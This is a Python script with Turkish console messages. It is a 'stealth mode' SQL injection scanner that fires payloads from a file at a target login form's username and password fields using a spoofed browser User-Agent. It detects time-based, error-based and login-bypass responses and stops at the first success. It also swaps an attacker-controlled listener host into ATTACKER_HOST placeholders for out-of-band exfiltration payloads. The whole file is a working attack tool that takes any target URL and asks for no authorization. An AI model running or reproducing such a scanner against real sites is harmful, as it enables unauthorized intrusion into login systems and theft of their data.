import requests
import time

def advanced_sqli_scan_v4_1(target_url, payload_file, callback_url=None):
    print(f"\n{'='*70}")
    print(f"[*] SQL INJECTION SCANNER v4.1 (STEALTH MODE)")
    print(f"[*] Hedef: {target_url}")
    print(f"[*] Mod: İLK BULDUĞUNDA DURACAK")
    if callback_url:
        print(f"[*] Listener: {callback_url}")
    print(f"{'='*70}\n")

    try:
        with open(payload_file, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(f"[*] {len(payloads)} adet payload yüklendi. Tarama başlıyor...\n")
    except FileNotFoundError:
        print("[HATA] Payload dosyası bulunamadı!")
        return

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    input_fields = ['uname', 'pass']

    with requests.Session() as s:
        vuln_found = False
        
        for i, payload in enumerate(payloads):
            if vuln_found: break 

            if i % 5 == 0:
                print(f"[*] Tarama: {i}/{len(payloads)} tamamlandı...", end='\r')

            current_payload = payload
            if callback_url and "ATTACKER_HOST" in payload:
                clean_host = callback_url.replace("http://", "").replace("https://", "").strip("/")
                current_payload = payload.replace("ATTACKER_HOST", clean_host)
            elif "ATTACKER_HOST" in payload and not callback_url:
                continue

            for field in input_fields:
                if vuln_found: break
                
                data = {}
                for f in input_fields:
                    data[f] = current_payload if f == field else "test"

                start_time = time.time()
                
                try:
                    response = s.post(target_url, data=data, headers=headers, timeout=20)
                    duration = time.time() - start_time

                    if duration >= 5:
                        time_keywords = ['sleep', 'waitfor', 'delay', 'benchmark', 'pg_sleep']
                        if any(k in current_payload.lower() for k in time_keywords):
                            print(f"\n\n[!!!] ZAFİYET BULUNDU (Time-Based) - Tarama Durduruluyor.")
                            print(f"    Payload: {current_payload}")
                            print(f"    Süre: {round(duration, 2)}sn")
                            vuln_found = True
                            break

                    error_indicators = ["SQL syntax", "mysql_fetch", "MariaDB", "ORA-", "syntax error", "Welcome", "Warning", "logout", "Logout", "user info"]
                    for indicator in error_indicators:
                        if indicator in response.text:
                            print(f"\n\n[!] ZAFİYET BULUNDU (Error-Based) - Tarama Durduruluyor.")
                            print(f"    Payload: {current_payload}")
                            print(f"    Hata Mesajı: {indicator}")
                            vuln_found = True
                            break

                except requests.Timeout:
                    print(f"\n\n[!!!] ZAFİYET BULUNDU (TIMEOUT) - Tarama Durduruluyor.")
                    print(f"    Payload: {current_payload}")
                    vuln_found = True
                    break
                except requests.RequestException:
                    pass

    if vuln_found:
        print(f"\n[+] Tebrikler! Açık bulundu.")
    else:
        print(f"\n[-] Tarama bitti. Hiçbir payload işe yaramadı.")

# --- İŞTE BU KISIM EKSİKSE ÇALIŞMAZ ---
if __name__ == "__main__":
    target_input = input("Hedef URL (Örn: http://site.com/login.php): ").strip()
    
    print("\n[OPSİYONEL] Listener URL'si (Yoksa Enter'a bas):")
    callback_input = input("Listener: ").strip()
    
    if target_input:
        advanced_sqli_scan_v4_1(target_input, 'payloads.txt', callback_input)
    
    # Ekran hemen kapanmasın diye:
    input("\nÇıkmak için Enter'a basın...")